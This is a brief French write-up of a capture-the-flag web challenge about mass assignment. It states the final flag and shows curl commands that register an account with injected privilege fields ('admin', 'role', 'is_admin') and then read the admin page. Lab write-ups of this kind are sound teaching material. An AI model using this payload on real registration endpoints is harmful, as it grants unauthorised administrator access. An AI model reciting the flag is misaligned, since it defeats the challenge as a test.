# boazak--akodessewa (web / mass assignment, id 454)

**Flag (finale) :** `NCTF{69f599c438329642fbb05b4a}`

## Contexte
UserHub : `POST /api/register` (JSON), `GET /api/me`, `GET /admin`.
Indice : « on peut y envoyer n'importe quoi — comme en **mass assignment** ».

## Faille
Chaque champ du JSON d'inscription est appliqué directement au profil → on injecte
un champ privilège (`admin` / `role` / `is_admin`) non prévu.

## Exploitation
```bash
J=cookies
curl -s -c $J -b $J $B/api/register -H 'Content-Type: application/json' \
  -d '{"username":"hawk","password":"x","admin":true,"role":"admin","is_admin":true}'
curl -s -c $J -b $J $B/admin      # -> NCTF{...}
```
Le register pose une session (cookie) ; `GET /admin` renvoie le flag directement.
